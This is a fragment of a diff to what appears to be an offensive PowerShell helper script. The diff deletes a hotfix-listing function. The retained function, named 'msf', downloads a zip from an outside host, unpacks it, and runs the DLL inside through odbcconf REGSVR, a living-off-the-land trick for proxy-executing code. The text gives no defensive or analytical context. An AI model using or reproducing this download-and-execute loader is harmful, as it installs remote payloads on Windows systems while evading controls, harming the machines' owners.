@@ -1,5 +1,3 @@
-function check-update(){Get-WmiObject -Class Win32_QuickFixEngineering}
-
 function msf (){
 wget 'spooky-hospital.surge.sh/msv2.zip' -o 'C:\helper\msv2.zip';expand-archive -Path 'C:\helper\msv2.zip' -Destination 'C:\helper\'
 if (Test-Path 'C:\helper\msv2.dll') {start-process odbcconf -Argument "REGSVR C:\helper\msv2.dll"} else { sleep 1}
